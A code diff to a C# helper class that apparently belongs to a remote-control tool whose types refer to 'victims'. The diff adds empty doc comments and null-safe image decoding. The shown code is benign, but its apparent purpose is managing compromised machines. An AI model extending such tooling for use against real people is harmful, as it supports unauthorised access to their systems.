@@ -12,9 +12,27 @@ namespace Alien
     {
         public clsTool() { }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="lv"></param>
+        /// <returns></returns>
         public static List<ListViewItem> fnExtractListViewSelectedItems(ListView lv) => lv.SelectedItems.Cast<ListViewItem>().ToList();
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <typeparam name="T"></typeparam>
+        /// <param name="web"></param>
+        /// <returns></returns>
         public static T? fnFindForm<T>(clsWeb web) where T : Form => fnFindForm<T>(web.m_victim);
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <typeparam name="T"></typeparam>
+        /// <param name="victim"></param>
+        /// <returns></returns>
         public static T? fnFindForm<T>(clsVictim victim) where T : Form
         {
             foreach (T form in Application.OpenForms.OfType<T>())
@@ -59,15 +77,27 @@ namespace Alien
         /// </summary>
         /// <param name="szB64str">Image base64 string value.</param>
         /// <returns>Image object.</returns>
-        public static Image fnimgB64strToImage(string szB64str)
+        public static Image? fnimgB64strToImage(string szB64str)
         {
-            byte[] abBuffer = Convert.FromBase64String(szB64str);
-            using (MemoryStream ms = new MemoryStream(abBuffer))
+            try
             {
-                return Image.FromStream(ms);
+                byte[] abBuffer = Convert.FromBase64String(szB64str);
+                using (MemoryStream ms = new MemoryStream(abBuffer))
+                {
+                    return Image.FromStream(ms);
+                }
+            }
+            catch
+            {
+                return null;
             }
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="szExt"></param>
+        /// <returns></returns>
         public static string fnszGenerateFileNameWithDateTime(string szExt = "txt")
         {
             if (szExt.StartsWith("."))
@@ -86,6 +116,12 @@ namespace Alien
             }) + $".{szExt}";
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="conn"></param>
+        /// <param name="szQuery"></param>
+        /// <returns></returns>
         public static DataTable fnSqlQuery(SQLiteConnection conn, string szQuery)
         {
             DataTable dt = new DataTable();
